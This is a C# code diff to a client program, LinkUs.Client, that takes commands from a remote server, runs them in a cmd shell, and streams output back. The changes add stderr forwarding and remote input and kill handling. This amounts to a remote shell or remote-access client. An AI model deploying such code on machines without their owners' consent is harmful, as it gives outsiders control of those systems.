@@ -15,6 +15,7 @@ namespace LinkUs.Client
         private static readonly UTF8Encoding Encoding = new UTF8Encoding();
         private static readonly ManualResetEvent ManualResetEvent = new ManualResetEvent(false);
         private static readonly ISerializer Serializer = new JsonSerializer();
+        private static Shell _shell;
 
         static void Main(string[] args)
         {
@@ -67,8 +68,8 @@ namespace LinkUs.Client
             var command = Serializer.Deserialize<Command>(package.Content);
             if (command.Name == "ExecuteShellCommand") {
                 var executeRemoteCommand = Serializer.Deserialize<ExecuteShellCommand>(package.Content);
-                var shell = new Shell(transmitter, package, executeRemoteCommand);
-                shell.Execute().Wait();
+                _shell = new Shell(transmitter, package, executeRemoteCommand);
+                _shell.Execute();
             }
             else if (command.Name == "date") {
                 var packageResponse = package.CreateResponsePackage(Serializer.Serialize(DateTime.Now.ToShortDateString()));
@@ -77,6 +78,13 @@ namespace LinkUs.Client
             else if (command.Name == "ping") {
                 var packageResponse = package.CreateResponsePackage(Serializer.Serialize("ok"));
                 transmitter.Send(packageResponse);
+            }
+            else if (command.Name == typeof(SendInputToShellCommand).Name) {
+                var sendInputToShellCommand = Serializer.Deserialize<SendInputToShellCommand>(package.Content);
+                _shell.Write(sendInputToShellCommand.Input);
+            }
+            else if (command.Name == typeof(KillShellCommand).Name) {
+                _shell.Stop();
             }
             else {
                 var packageResponse = package.CreateResponsePackage(Serializer.Serialize("unknown command"));
@@ -90,7 +98,7 @@ namespace LinkUs.Client
         private readonly PackageTransmitter _packageTransmitter;
         private readonly Package _package;
         private readonly Process _shellProcess;
-        private readonly JsonSerializer jsonSerializer = new JsonSerializer();
+        private readonly JsonSerializer _jsonSerializer = new JsonSerializer();
 
         public Shell(PackageTransmitter packageTransmitter, Package package, ExecuteShellCommand executeRemoteCommand)
         {
@@ -100,11 +108,16 @@ namespace LinkUs.Client
             if (executeRemoteCommand.CommandLine != "cmd") {
                 _shellProcess.StartInfo.Arguments = $"/C {executeRemoteCommand.CommandLine} " + string.Join(" ", executeRemoteCommand.Arguments);
             }
+            _shellProcess.ErrorDataReceived += ShellProcessOnErrorDataReceived;
+        }
+
+        private void ShellProcessOnErrorDataReceived(object o, DataReceivedEventArgs dataReceivedEventArgs)
+        {
+            SendObject(new ShellOuputReceivedResponse(dataReceivedEventArgs.Data));
         }
 
         public Task Execute()
         {
-            _packageTransmitter.PackageReceived += PackageTransmitterOnPackageReceived;
             _shellProcess.Start();
 
             SendObject(new ShellStartedResponse());
@@ -120,26 +133,13 @@ namespace LinkUs.Client
                         SendObject(new ShellOuputReceivedResponse(textReceived));
                     }
                 }
-                _packageTransmitter.PackageReceived -= PackageTransmitterOnPackageReceived;
                 SendObject(new ShellEndedResponse(_shellProcess.ExitCode));
             });
         }
 
-        private void PackageTransmitterOnPackageReceived(object sender, Package package)
-        {
-            var commandLine = jsonSerializer.Deserialize<Command>(package.Content);
-            if (commandLine.Name == typeof(SendInputToShellCommand).Name) {
-                var sendInputToShellCommand = jsonSerializer.Deserialize<SendInputToShellCommand>(package.Content);
-                _shellProcess.StandardInput.Write(sendInputToShellCommand.Input);
-            }
-            else if (commandLine.Name == typeof(KillShellCommand).Name) {
-                _shellProcess.Kill();
-                _shellProcess.WaitForExit();
-            }
-        }
         private void SendObject(object response)
         {
-            var content = jsonSerializer.Serialize(response);
+            var content = _jsonSerializer.Serialize(response);
             var responsePackage = _package.CreateResponsePackage(content);
             _packageTransmitter.Send(responsePackage);
         }
@@ -159,6 +159,15 @@ namespace LinkUs.Client
                 },
                 EnableRaisingEvents = true
             };
+        }
+        public void Stop()
+        {
+            _shellProcess.Kill();
+            _shellProcess.WaitForExit();
+        }
+        public void Write(string input)
+        {
+            _shellProcess.StandardInput.Write(input);
         }
     }
 }
